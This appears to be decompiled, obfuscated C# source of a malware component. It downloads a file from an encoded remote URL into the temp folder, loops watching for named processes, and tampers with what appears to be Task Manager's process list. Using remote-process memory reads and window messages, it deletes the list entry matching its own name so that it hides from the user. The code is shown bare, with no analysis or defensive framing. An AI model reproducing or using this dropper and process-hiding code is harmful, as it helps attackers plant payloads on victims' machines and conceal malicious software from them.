using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gtzdezosLTmcL;

internal sealed class lUJYSNgLmoSv
{
	private struct eGubbORuAxc
	{
		public uint MazwPWkmBuTbyBU;

		public IntPtr OmcYYCuLQwXCb;

		public IntPtr OQChoPbOjDReEp;

		public uint FNsWvvBRCHwpw;

		public uint ZBoGaMxvPmRYq;

		public IntPtr rnwWqOwgyltAcUx;

		public uint jWdndmcwbyAM;

		public int nKlfiQnINEomt;

		public IntPtr hUFsFnpLIBsZEY;
	}

	private static volatile bool ErPrOWDCdMDpq;

	public static volatile bool zKcfHNnkDntP;

	[NonSerialized]
	internal static GetString getString_0;

	public static string GEVxechDmCNkONU()
	{
		if (IntPtr.Size == 8)
		{
			pjsEsrnLXK.TsImQHWoLIhPLO = xYYlXqlwLCVd(new Uri(pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366342))));
		}
		else
		{
			pjsEsrnLXK.TsImQHWoLIhPLO = xYYlXqlwLCVd(new Uri(pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366196))));
		}
		return pjsEsrnLXK.TsImQHWoLIhPLO;
	}

	public static string xYYlXqlwLCVd(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107369545), getString_0(107359772)).Remove(0, 3) + getString_0(107369572);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process AihHpUDdvmftmixw(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void KOztEqxFQcVJbJv(string[] string_0)
	{
		string text = GEVxechDmCNkONU();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = AihHpUDdvmftmixw(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					pjsEsrnLXK.zNySGPYjPOmLG(text, text2 + getString_0(107358284) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					pjsEsrnLXK.zNySGPYjPOmLG(text, text2 + getString_0(107358284) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107366594));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr GQeyVIOQrtjxss);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr GRNltufHEjIXHZ, IntPtr PYzWKRcXXBK, byte[] DyAGtOCuTfZL, uint qXVYLPUjjyjpG, out UIntPtr TeZNzSOSOUcIhb);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr SIOvOGTefIkMBhU, IntPtr FpljOXuXhgFC, [Out] byte[] OWKuHLlTWhKe, int MkfBxERfVc, out UIntPtr BAdYTicYeVgM);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr IZneNRTBfcHi, out uint YFtHpPSVrNFGuVP);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] wgPzDhUDscEznoV(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr TrJmSqBlhJUa(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void ihMlvRqLwJpeA(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr FNVNFOwUlNLc(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void wpaeBdVjTwbpOLC(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr cBeJwWyEfNWo()
	{
		IntPtr intPtr = FindWindow(getString_0(107366585), getString_0(107366560));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107366527), getString_0(107366518));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107366527), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107366501), getString_0(107366448));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107366527), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107366501), getString_0(107366467));
	}

	private static IntPtr JTRAEIJuxDBiPg(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void cKJXNoIgIAmGLMj(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void AvAZJdjUZSpE(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string JvtgxVinocNSyT(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		eGubbORuAxc eGubbORuAxc = default(eGubbORuAxc);
		GetWindowThreadProcessId(intptr_0, out var YFtHpPSVrNFGuVP);
		IntPtr intPtr = TrJmSqBlhJUa(YFtHpPSVrNFGuVP);
		IntPtr intPtr2 = FNVNFOwUlNLc((uint)Marshal.SizeOf(eGubbORuAxc), intPtr);
		IntPtr intPtr3 = FNVNFOwUlNLc(50u, intPtr);
		eGubbORuAxc.OmcYYCuLQwXCb = intptr_1;
		eGubbORuAxc.OQChoPbOjDReEp = (IntPtr)0;
		eGubbORuAxc.jWdndmcwbyAM = 50u;
		eGubbORuAxc.rnwWqOwgyltAcUx = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, wgPzDhUDscEznoV(eGubbORuAxc), (uint)Marshal.SizeOf(eGubbORuAxc), out var TeZNzSOSOUcIhb);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out TeZNzSOSOUcIhb);
		wpaeBdVjTwbpOLC(intPtr, intPtr2, (uint)Marshal.SizeOf(eGubbORuAxc));
		wpaeBdVjTwbpOLC(intPtr, intPtr3, 50u);
		ihMlvRqLwJpeA(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void PhKdstqqTxizn(string string_0)
	{
		IntPtr intPtr = cBeJwWyEfNWo();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)JTRAEIJuxDBiPg(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = JvtgxVinocNSyT(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				cKJXNoIgIAmGLMj(intPtr, (IntPtr)i);
			}
		}
	}

	private static void aTZHfkOXSyFwy()
	{
		IntPtr intPtr = cBeJwWyEfNWo();
		if (intPtr != IntPtr.Zero)
		{
			AvAZJdjUZSpE(intPtr);
			AvAZJdjUZSpE(intPtr);
			AvAZJdjUZSpE(intPtr);
			AvAZJdjUZSpE(intPtr);
			AvAZJdjUZSpE(intPtr);
		}
	}

	public static void eIJvGeiCmHwoEXUXS()
	{
		Thread thread = new Thread(jjgQqYSNTkxs);
		thread.Start();
	}

	private static void jjgQqYSNTkxs()
	{
		while (!ErPrOWDCdMDpq)
		{
			if (zKcfHNnkDntP)
			{
				PhKdstqqTxizn(Process.GetCurrentProcess().ProcessName + getString_0(107369572));
				Thread.Sleep(525);
			}
			else
			{
				aTZHfkOXSyFwy();
				Thread.Sleep(1000);
			}
		}
		ErPrOWDCdMDpq = false;
	}

	static lUJYSNgLmoSv()
	{
		Strings.CreateGetStringDelegate(typeof(lUJYSNgLmoSv));
		ErPrOWDCdMDpq = false;
		zKcfHNnkDntP = true;
	}
}
